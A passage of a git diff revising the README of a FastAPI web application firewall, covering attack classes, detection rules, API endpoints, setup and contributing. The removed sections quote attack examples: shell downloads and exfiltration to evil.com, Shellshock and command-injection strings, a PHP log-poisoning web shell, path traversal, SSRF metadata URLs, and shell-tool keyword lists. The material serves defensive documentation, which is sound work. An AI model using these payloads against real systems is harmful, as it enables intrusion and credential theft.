-# → 403 Forbidden — XSS-003 HIGH
-```
-
----
-
-### 3. Remote Code Execution (RCE) — CWE-78
-
-RCE vulnerabilities allow attackers to execute arbitrary OS commands on the server. Often arises from unsafe `eval()`, deserialization, shell command construction, or legacy CGI (Shellshock CVE-2014-6271).
-
-**How Attackers Exploit It:**
-
-```bash
-# Shellshock via User-Agent header (CVE-2014-6271)
-User-Agent: () { :; }; /bin/bash -c 'id; whoami; cat /etc/passwd'
-
-# Command injection via query parameter
-https://example.com/ping?host=127.0.0.1; curl http://evil.com/shell.sh | bash
-
-# Backtick execution
-?query=`wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`
-
-# Subshell injection
-?input=$(cat /etc/shadow | base64 | curl -d @- https://evil.com)
-```
-
-**How OUTLOOP Blocks It:**
-- Dedicated RCE rule group: Shellshock function definition pattern `() { :;`, backtick operators, `$()` subshell syntax
-- Command injection rules for `;`, `|`, `&&`, `||` combined with known shell commands (`cat`, `wget`, `curl`, `bash`, `sh`)
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=()%20{%20:;%20};%20/bin/bash%20-i"
-# → 403 Forbidden — RCE-001 CRITICAL
-```
-
----
-
-### 4. Path Traversal — CWE-22
-
-Path traversal attacks navigate relative directory paths to access restricted files outside the web root, such as system credentials, configuration files, or private keys.
-
-**How Attackers Exploit It:**
-
-```
-# Unix-style traversal to read /etc/passwd
-../../../../etc/passwd
-
-# Null byte injection to bypass extension filters
-../../../../etc/passwd%00.jpg
-
-# Windows-style traversal
-..\..\..\..\windows\system32\cmd.exe
-
-# URL-encoded traversal
-%2e%2e%2f%2e%2e%2fetc%2fpasswd
-
-# Double URL-encoded (bypass naive decoders)
-%252e%252e%252fetc%252fpasswd
-```
-
-**How OUTLOOP Blocks It:**
-- 9 path traversal patterns covering `../`, `..\`, URL-encoded (`%2e%2e%2f`), double-encoded (`%252e`), and null-byte injection
-- Detection of sensitive path targets: `/etc/passwd`, `/etc/shadow`, `windows/system32`, `.env`, `.git`
-- Multi-pass URL decoder normalizes all encoding variants before pattern matching
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=../../../../etc/passwd"
-# → 403 Forbidden — PATH-002 HIGH
-```
-
----
-
-### 5. Server-Side Request Forgery (SSRF) — CWE-918
-
-SSRF coerces the server into making unauthorized requests to internal network locations — particularly dangerous in cloud environments where metadata endpoints can expose credentials and instance roles.
-
-**How Attackers Exploit It:**
-
-```
-# AWS EC2 metadata endpoint (credential theft)
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Google Cloud metadata endpoint
-http://metadata.google.internal/computeMetadata/v1/
-
-# Internal network probe (bypassing perimeter firewall)
-http://192.168.1.1/admin
-http://10.0.0.1:8080/internal-api
-
-# DNS rebinding
-http://attacker-controlled-domain.com/ → resolves to 169.254.169.254
-```
-
-**How OUTLOOP Blocks It:**
-- 7 SSRF/metadata patterns blocking AWS/GCP metadata IPs (`169.254.169.254`, `metadata.google.internal`)
-- Private IP range detection: `10.x.x.x`, `172.16.x.x`–`172.31.x.x`, `192.168.x.x`
-- Loopback abuse detection: `localhost`, `127.0.0.1`, `::1`
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=http://169.254.169.254/latest/meta-data/"
-# → 403 Forbidden — SSRF-001 HIGH
-```
-
----
-
-### 6. Command Injection — CWE-77
-
-Command injection occurs when user input is passed unsanitized to a system shell, enabling attackers to chain arbitrary OS commands.
-
-**How Attackers Exploit It:**
-
-```bash
-# Semicolon chaining
-127.0.0.1; cat /etc/shadow
-
-# Pipe to attacker
-127.0.0.1 | curl -d "$(cat /etc/passwd)" https://evil.com
-
-# AND/OR chaining
-127.0.0.1 && wget http://evil.com/backdoor.sh -O /tmp/b && bash /tmp/b
-
-# Subshell
-$(whoami)
-`id`
-```
-
-**How OUTLOOP Blocks It:**
-- 8 command injection patterns covering shell chaining operators: `;`, `|`, `&&`, `||`
-- Backtick and `$()` subshell detection
-- Shell command signature matching: `cat`, `wget`, `curl`, `whoami`, `id`, `uname`, `ps`, `ls`
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=\$(whoami)"
-# → 403 Forbidden — CMD-001 CRITICAL
-```
-
----
-
-### 7. Local File Inclusion (LFI) — CWE-98
-
-LFI allows attackers to include files from the local filesystem in server responses — often used to read config files, logs, or escalate to RCE via log poisoning.
-
-**How Attackers Exploit It:**
-
-```php
-# Direct inclusion of sensitive files
-?page=../../../../etc/passwd
-?file=../config/database.php
-
-# Log poisoning (inject PHP into access log, then include it)
-# Step 1: inject into User-Agent:
-User-Agent: <?php system($_GET['cmd']); ?>
-# Step 2: include the log:
-?page=../../../../var/log/apache2/access.log&cmd=id
-
-# PHP wrapper abuse
-?file=php://filter/convert.base64-encode/resource=/etc/passwd
-?file=php://input (with POST body containing PHP)
-```
-
-**How OUTLOOP Blocks It:**
-- 5 LFI patterns targeting `include()`, `require()`, `php://` wrapper schemes, and direct sensitive file references
-- Detection of PHP filter chain abuse patterns
-
----
-
-## Live Testing Commands
-
-Fire these payloads at the secure test route to verify detection in real time:
-
-```bash
-# SQL Injection (Expect 403 Forbidden — CRITICAL)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=' UNION SELECT username, password FROM users --"
-
-# XSS (Expect 403 Forbidden — HIGH)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=<script>alert(document.cookie)</script>"
-
-# Path Traversal (Expect 403 Forbidden — HIGH)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=../../../../etc/passwd"
-
-# Command Injection (Expect 403 Forbidden — CRITICAL)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=\$(whoami)"
-
-# SSRF — AWS Metadata (Expect 403 Forbidden — HIGH)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=http://169.254.169.254/latest/meta-data/"
-
-# Shellshock RCE (Expect 403 Forbidden — CRITICAL)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=()%20{%20:;%20};%20/bin/bash%20-i"
-
-# Clean Request (Expect 200 OK)
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=HelloWAF"
-```
-
----
-
-## Technology Stack
-
-| Technology | Version | Purpose | Why Chosen |
-|------------|---------|---------|------------|
-| **Python** | 3.9+ | Core WAF runtime | Strong regex support; `re.compile()` for pre-compiled patterns; async I/O via `asyncio` |
-| **FastAPI** | 0.109+ | Web framework & API layer | ASGI-native; built-in OpenAPI/Swagger; `Middleware` class for clean request interception |
-| **Uvicorn** | 0.27+ | ASGI server | High-performance async server; required by FastAPI for Vercel serverless runtime |
-| **Starlette** | 0.36+ | Middleware base | FastAPI's underlying ASGI toolkit; `BaseHTTPMiddleware` used for WAF hook |
-| **HTML5 / CSS3** | — | SOC Dashboard frontend | Zero framework overhead; terminal aesthetic with custom CSS variables |
-| **Three.js** | r160 | 3D attack globe visualization | WebGL-accelerated particle system for incoming attack animation |
-| **Astro** | 3.x | Frontend build tool | Component-based static generation for the documentation/marketing layer |
-| **JavaScript (ES2022)** | — | Dashboard interactivity, SSE client | Native `EventSource` API for SSE; `fetch` for REST calls |
-| **Pytest** | 7.x | Test framework | 44 tests across health, WAF engine, rate limiting, admin, and route coverage |
-| **Vercel** | — | Serverless deployment platform | Zero-config Python serverless functions; edge CDN for static assets |
-| **GitHub Actions** | — | CI/CD pipeline | Automated `pytest` run on push; deploy-on-merge to main |
-
----
-
-## API Documentation
-
-All endpoints are available at `https://outloop-waf.vercel.app`. Interactive documentation: [Swagger UI](https://outloop-waf.vercel.app/api/docs) · [ReDoc](https://outloop-waf.vercel.app/api/redoc)
-
-### Public Endpoints
-
-| Method | Endpoint | Description | Example Response |
-|--------|----------|-------------|-----------------|
-| `GET` | `/api/health` | Service health check | `{"status": "healthy", "version": "1.0.0", "rules": 57}` |
-| `GET` | `/api/ready` | Readiness probe | `{"ready": true, "engine": "loaded"}` |
-| `GET` | `/api/metrics` | Traffic counters | `{"total": 1024, "blocked": 312, "allowed": 712, "uptime_s": 3600}` |
-| `GET` | `/api/status` | Engine gravity status | `{"gravity": "9.8 m/s²", "engine": "ACTIVE"}` |
-| `GET` | `/api/secure/test` | WAF inspection endpoint (sandbox) | `200 {"clean": true}` or `403 {"blocked": true, "rule": "SQLi-007"}` |
-| `GET` | `/api/secure/echo` | Echo request headers back | `{"headers": {...}, "waf_status": "clean"}` |
-| `GET` | `/api/events/threats` | SSE threat stream | `text/event-stream` — continuous JSON event data |
-| `GET` | `/api/docs` | Swagger UI | OpenAPI interactive documentation |
-| `GET` | `/api/redoc` | ReDoc UI | Alternative API documentation renderer |
-
-### Admin Endpoints (require `X-Admin-Key` header)
-
-| Method | Endpoint | Description | Request Body |
-|--------|----------|-------------|--------------|
-| `GET` | `/api/admin/stats` | Detailed engine statistics | *(none)* |
-| `GET` | `/api/admin/rules` | Full signature list with regex | *(none)* |
-| `POST` | `/api/admin/ban` | Add IP to blocklist | `{"ip": "203.0.113.42", "reason": "Port scan"}` |
-| `DELETE` | `/api/admin/ban/{ip}` | Remove IP from blocklist | *(path param)* |
-| `GET` | `/api/admin/blocklist` | List all banned IPs | *(none)* |
-
-### Example Requests
-
-```bash
-# Health check
-curl https://outloop-waf.vercel.app/api/health
-
-# Test a clean payload
-curl "https://outloop-waf.vercel.app/api/secure/test?payload=hello+world"
-# → 200 {"clean": true, "request_id": "..."}
-
-# Test SQL injection (returns 403)
-curl "https://outloop-waf.vercel.app/api/secure/test?payload=%27%20OR%201%3D1%3B--"
-# → 403 {"blocked": true, "rule_id": "SQLi-001", "severity": "CRITICAL"}
-
-# Open SSE stream
-curl -H "Accept: text/event-stream" https://outloop-waf.vercel.app/api/events/threats
-
-# Admin: ban an IP
-curl -X POST https://outloop-waf.vercel.app/api/admin/ban \
-  -H "X-Admin-Key: your-admin-key" \
-  -H "Content-Type: application/json" \
-  -d '{"ip": "203.0.113.42", "reason": "Automated SQLi scanner"}'
-```
-
----
-
-## External Integrations
-
-| Library | Source | Role in Project |
-|---------|--------|-----------------|
-| **Three.js** | [threejs.org](https://threejs.org) | WebGL 3D globe for live attack visualization on the dashboard hero |
-| **FastAPI** | [fastapi.tiangolo.com](https://fastapi.tiangolo.com) | ASGI web framework; automatic OpenAPI schema generation |
-| **Starlette** | [starlette.io](https://www.starlette.io) | BaseHTTPMiddleware used for WAF request interception hook |
-| **Uvicorn** | [uvicorn.org](https://www.uvicorn.org) | ASGI server runtime; production-ready for Vercel's Python runtime |
-| **Pytest** | [pytest.org](https://pytest.org) | Test discovery, fixtures, and assertion framework for 44 test cases |
-| **Astro** | [astro.build](https://astro.build) | Static site generator for the `/frontend` documentation layer |
-
----
-
-## Deployment & Infrastructure
-
-OUTLOOP WAF runs entirely on **Vercel's serverless platform**, with no dedicated servers to manage.
+### Infrastructure Properties
+
+| Property | Value |
+|----------|-------|
+| **Cold Start** | ~300ms on first invocation |
+| **Warm Latency** | < 10ms per request |
+| **Global PoPs** | 100+ edge locations |
+| **Scaling** | Auto-scales to demand |
+| **Ops Burden** | Zero — no servers, no patches |
+| **Cost Baseline** | Fully operable on Vercel hobby plan |
 
 ### `vercel.json` Routing
 
@@ -1037,29 +1042,20 @@ OUTLOOP WAF runs entirely on **Vercel's serverless platform**, with no dedicated
 }
 ```
 
-### Architecture Advantages
-
-| Property | Benefit |
-|----------|---------|
-| **Cold start** | ~300ms on first invocation; sub-10ms once warm |
-| **Edge PoPs** | 100+ global points of presence — low-latency for international traffic |
-| **Auto-scaling** | Handles traffic spikes without configuration |
-| **No ops** | Zero servers, patches, or uptime monitoring required |
-| **Free tier** | Fully operable on Vercel's hobby plan |
-
 ### Environment Variables
 
 ```bash
-# .env (local development)
-WAF_ADMIN_KEY=your-secret-key-here        # X-Admin-Key validation value
-ALLOWED_ORIGINS=http://localhost:3000     # Allowed CORS client origins
-UPSTASH_REDIS_REST_URL=                   # Optional: Upstash Redis endpoint for persistent stats
-UPSTASH_REDIS_REST_TOKEN=                 # Optional: Upstash Redis auth token
-RATE_BURST_REQUESTS=20                    # Max requests allowed in the burst window
-RATE_BURST_SECONDS=1                      # Burst rate limiter window size
-WAF_MODE=enforce                          # enforce | monitor | disabled
-LOG_LEVEL=INFO                            # DEBUG | INFO | WARNING | ERROR
+WAF_ADMIN_KEY=your-secret-key          # X-Admin-Key validation value
+ALLOWED_ORIGINS=http://localhost:3000  # CORS allowed origins
+UPSTASH_REDIS_REST_URL=                # Optional: Redis for persistent cross-instance stats
+UPSTASH_REDIS_REST_TOKEN=              # Optional: Redis auth token
+RATE_BURST_REQUESTS=20                 # Max requests per burst window
+RATE_BURST_SECONDS=1                   # Burst window size in seconds
+WAF_MODE=enforce                       # enforce | monitor | disabled
+LOG_LEVEL=INFO                         # DEBUG | INFO | WARNING | ERROR
 ```
+
+> Set these in the Vercel project dashboard under **Settings → Environment Variables** before deploying to production.
 
 ---
 
@@ -1069,64 +1065,48 @@ LOG_LEVEL=INFO                            # DEBUG | INFO | WARNING | ERROR
 
 ```
 Python  ≥ 3.9
-Node.js ≥ 18.x  (for Astro frontend only)
+Node.js ≥ 18.x  (Astro frontend only)
 pip     ≥ 23.x
 ```
 
-### 1. Clone the Repository
+### Local Setup
 
 ```bash
+# 1. Clone
 git clone https://github.com/obstinix/outloop-waf.git
 cd outloop-waf
-```
 
-### 2. Set Up Python Environment
-
-```bash
+# 2. Create virtual environment
 python -m venv venv
+source venv/bin/activate        # Linux / macOS
+# venv\Scripts\activate         # Windows
 
-# Linux / macOS
-source venv/bin/activate
-
-# Windows
-venv\Scripts\activate
-```
-
-### 3. Install Dependencies
-
-```bash
+# 3. Install dependencies
 pip install -r requirements.txt
-```
 
-### 4. Configure Environment
-
-```bash
+# 4. Configure environment
 cp .env.example .env
-# Edit .env — set your WAF_ADMIN_KEY and preferred settings
-```
+# Edit .env — set WAF_ADMIN_KEY and preferred options
 
-### 5. Run the Development Server
-
-```bash
+# 5. Start development server
 python -m uvicorn api.index:app --reload --port 8000
 ```
 
-### 6. Access the Dashboard
+Access the running stack:
 
 ```
 SOC Dashboard     →  http://localhost:8000
 Swagger API Docs  →  http://localhost:8000/api/docs
-ReDoc             →  http://localhost:8000/api/redoc
 Health Check      →  http://localhost:8000/api/health
 ```
 
-### 7. Run the Test Suite
+### Run the Test Suite
 
 ```bash
 pytest -v
 ```
 
-Expected output:
+Expected:
 
 ```
 tests/test_health.py          ✓  6 passed
@@ -1141,21 +1121,19 @@ tests/test_rate_limiter.py    ✓  passed
 TOTAL                         ✓ 44 passed
 ```
 
-### 8. Docker Environment
+### Docker
 
 ```bash
 docker-compose up --build
 ```
 
-### 9. Deploy to Vercel
+### Deploy to Vercel
 
 ```bash
 npm install -g vercel
 vercel login
 vercel --prod
 ```
-
-> **Note:** Set environment variables in Vercel project dashboard under **Settings → Environment Variables** before deploying.
 
 ---
 
@@ -1164,131 +1142,137 @@ vercel --prod
 ```
 outloop-waf/
 ├── api/
-│   ├── index.py                 # FastAPI application entry point
+│   ├── index.py                  # FastAPI application entry point
 │   ├── static/
-│   │   └── index.html           # SOC Dashboard (Three.js + SSE client)
+│   │   └── index.html            # SOC Dashboard (Three.js + SSE client)
 │   ├── waf/
-│   │   ├── middleware.py        # BaseHTTPMiddleware — request interception
-│   │   ├── rules.py             # 57 signature definitions (regex + severity)
-│   │   ├── engine.py            # Threat analysis core (multi-pass decode + match)
-│   │   └── rate_limiter.py      # Sliding-window IP rate limiter
+│   │   ├── middleware.py         # BaseHTTPMiddleware — request interception hook
+│   │   ├── rules.py              # 57 signature definitions (regex + severity + ID)
+│   │   ├── engine.py             # Threat analysis core (multi-pass decode + regex match)
+│   │   └── rate_limiter.py       # Sliding-window per-IP rate limiter
 │   ├── routes/
-│   │   ├── health.py            # /api/health, /api/ready, /api/metrics
-│   │   ├── secure.py            # /api/secure/test, /api/secure/echo
-│   │   └── gravity.py           # /api/status (engine status)
+│   │   ├── health.py             # /api/health · /api/ready · /api/metrics
+│   │   ├── secure.py             # /api/secure/test · /api/secure/echo
+│   │   └── gravity.py            # /api/status
 │   └── utils/
-│       └── logger.py            # Structured JSON logging
-├── frontend/                    # Astro documentation layer
+│       └── logger.py             # Structured JSON logging
+├── frontend/                     # Astro documentation layer
 ├── tests/
-│   ├── test_health.py           # 6 health endpoint tests
-│   ├── test_waf.py              # 23 WAF engine tests (attack payloads)
-│   ├── test_antigravity.py      # 3 route and status tests
-│   ├── test_admin.py            # 3 admin endpoint authentication tests
-│   ├── test_evasion.py          # Evasion technique tests
-│   ├── test_events.py           # SSE stream tests
-│   ├── test_metrics.py          # Metrics endpoint tests
-│   └── test_rate_limiter.py     # Rate limiter tests
-├── .gitignore
+│   ├── test_health.py            # 6 health endpoint tests
+│   ├── test_waf.py               # 23 WAF engine tests (attack payload matrix)
+│   ├── test_antigravity.py       # 3 route and status tests
+│   ├── test_admin.py             # 3 admin endpoint authentication tests
+│   ├── test_evasion.py           # Encoding evasion bypass attempts
+│   ├── test_events.py            # SSE stream connection and event format
+│   ├── test_metrics.py           # Counter accuracy validation
+│   └── test_rate_limiter.py      # Sliding-window enforcement tests
 ├── Dockerfile
 ├── docker-compose.yml
-├── LICENSE                      # MIT License
-├── README.md
-├── pytest.ini                   # Pytest configuration
-├── requirements.txt             # Python dependencies
-└── vercel.json                  # Serverless routing configuration
+├── pytest.ini
+├── requirements.txt
+└── vercel.json
 ```
 
 ---
 
-## Contributing & Bug Reports
+## Contributing
 
-Contributions are welcome. Please follow these steps:
+Contributions that improve detection coverage, reduce false positives, or extend the platform are welcome.
+
+### For New Contributors
+
+Before opening a pull request, please read through the project's architecture section to understand how middleware interception, the multi-pass decoder, and the signature engine connect. The best first contributions are new WAF signatures — they follow a well-defined pattern and come with clear acceptance criteria (a passing positive test and a passing negative test).
+
+### Reporting Security Issues
+
+If you discover a WAF bypass — a payload that should be blocked but isn't — please open an issue tagged `[bypass]` with the payload, the expected rule category, and how you found it. Responsible disclosure is appreciated and credited.
 
 ### Reporting Bugs or Requesting Features
 
-**Found a bug? Have a feature idea?**
-
 👉 **[Open an Issue](https://github.com/obstinix/outloop-waf/issues/new/choose)**
 
-When filing a bug report, please include:
-- Python version and OS
-- Steps to reproduce the issue
-- Expected vs actual behavior
-- Relevant log output or error messages
-
-When requesting a feature, please describe the use case and why it would benefit the project.
+Include: Python version, OS, reproduction steps, expected vs actual behavior, and relevant log output.
 
 ### Submitting Pull Requests
 
-1. **Fork** the repository
-2. **Create** a feature branch: `git checkout -b feat/your-feature-name`
-3. **Write tests** for your changes in the `tests/` directory
-4. **Ensure all tests pass**: `pytest -v`
-5. **Commit** with conventional commit messages: `git commit -m "feat(waf): add SSRF metadata rule"`
-6. **Push** and open a **Pull Request** against `main`
+```bash
+# 1. Fork and branch
+git checkout -b feat/your-feature-name
 
-### Adding New WAF Rules
+# 2. Write tests first — every new WAF rule needs positive and negative coverage
+# 3. Verify the full suite passes
+pytest -v
 
-New signatures are added to `api/waf/rules.py`. Each rule must include:
+# 4. Commit with conventional messages
+git commit -m "feat(waf): add CRLF injection header rule CRLF-003"
+
+# 5. Push and open PR against main
+```
+
+### Adding a New WAF Signature
+
+New patterns are added to `api/waf/rules.py`:
 
 ```python
 {
-    "id": "CATEGORY-NNN",        # e.g. SQLi-014
-    "name": "Human readable name",
-    "severity": "CRITICAL",       # CRITICAL | HIGH | MEDIUM | LOW
+    "id": "CATEGORY-NNN",          # e.g. SQLi-014 · XSS-014 · CMD-009
+    "name": "Human readable label",
+    "severity": "CRITICAL",         # CRITICAL | HIGH | MEDIUM | LOW
     "pattern": r"your_regex_here",
-    "description": "What this detects and why"
+    "description": "What this detects, attack class, and why it matters"
 }
 ```
 
-> **Important:** All new patterns must have corresponding pytest tests in `tests/test_waf.py` with at least one positive (blocked) and one negative (clean) test case.
+**Acceptance criteria:**
+- At least one positive test (payload blocked) in `tests/test_waf.py`
+- At least one negative test (clean input passes) in `tests/test_waf.py`
+- No regressions in the existing 44 tests
+- Pattern documented with a real-world exploit example in the PR description
+
+The community benefits most from signatures covering new evasion techniques, emerging CVEs, and attack patterns not yet in the OWASP corpus.
+
+---
+
+## Research Foundation
+
+| # | Reference | Relevance |
+|---|-----------|-----------|
+| 1 | [OWASP Top Ten 2021](https://owasp.org/Top10/) | Primary threat taxonomy — A03 (SQLi/XSS), A10 (SSRF) detection priorities |
+| 2 | [NIST SP 800-44 v2](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final) | Web server hardening, header validation, access control |
+| 3 | [NIST SP 800-95](https://csrc.nist.gov/publications/detail/sp/800-95/final) | API gateway security model and admin route authentication |
+| 4 | [RFC 7230 — HTTP/1.1 Syntax](https://datatracker.ietf.org/doc/html/rfc7230) | Header parsing rules for CRLF injection detection |
+| 5 | [RFC 2697 — Three Color Marker](https://datatracker.ietf.org/doc/html/rfc2697) | Token-bucket basis for the sliding-window rate limiter |
+| 6 | [CWE Top 25 (2023)](https://cwe.mitre.org/top25/) | CWE-89, CWE-79, CWE-22 map directly to WAF rule categories |
+| 7 | Clarke, J. (2009). *SQL Injection Attacks and Defense*. Syngress. | Foundation for all 13 SQLi patterns |
+| 8 | Cox, R. (2007). [Regex Matching Can Be Simple and Fast](https://swtch.com/~rsc/regexp/regexp1.html) | Basis for compiled-regex over interpreted matching; sub-5ms performance |
+| 9 | Grossman, J. (2006). *XSS Attacks*. Syngress. | Reflected, Stored, and DOM-based XSS pattern fingerprints |
+| 10 | [OWASP WAF Evaluation Criteria v1.0](https://owasp.org/www-project-web-application-firewall-evaluation-criteria/) | Benchmark for signature coverage and false-positive targets |
+| 11 | Ristic, I. (2010). *ModSecurity Handbook*. Feisty Duck. | Reference WAF middleware architecture and rule chaining model |
+| 12 | Zalewski, M. (2011). *The Tangled Web*. No Starch Press. | Browser trust model; multi-pass decoder evasion-mitigation strategy |
 
 ---
 
 ## License
 
-```
-MIT License
-
-Copyright (c) 2026 obstinix (Piyush Pandey)
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
-See [LICENSE](LICENSE) for the full text.
+OUTLOOP WAF is released under the **[MIT License](https://github.com/obstinix/outloop-waf/blob/main/LICENSE)** — free to use, modify, and distribute with attribution.
 
 ---
 
 <div align="center">
 
+<br/>
+
 **OUTLOOP WAF** · Security Engine v1.0.0 · MIT License © 2026 [obstinix](https://github.com/obstinix)
 
-Python · FastAPI · Vercel · Zero-config perimeter protection
+*Python · FastAPI · Vercel · 57 Signatures · Zero-config perimeter protection*
 
-[![Live Demo](https://img.shields.io/badge/🌐%20Live%20Demo-outloop--waf.vercel.app-00d4ff?style=flat-square&labelColor=0a0a0a)](https://outloop-waf.vercel.app)
+<br/>
+
+[![Live Demo](https://img.shields.io/badge/🌐_Live_Demo-outloop--waf.vercel.app-00d4ff?style=flat-square&labelColor=0a0a0a)](https://outloop-waf.vercel.app)
 [![GitHub](https://img.shields.io/badge/GitHub-obstinix%2Foutloop--waf-181717?style=flat-square&logo=github)](https://github.com/obstinix/outloop-waf)
 [![Issues](https://img.shields.io/github/issues/obstinix/outloop-waf?style=flat-square)](https://github.com/obstinix/outloop-waf/issues)
 [![Stars](https://img.shields.io/github/stars/obstinix/outloop-waf?style=flat-square)](https://github.com/obstinix/outloop-waf/stargazers)
 
-*Built with intent. Protected with precision.*
+<br/>
 
 </div>
-ENDOFREADME
-
-
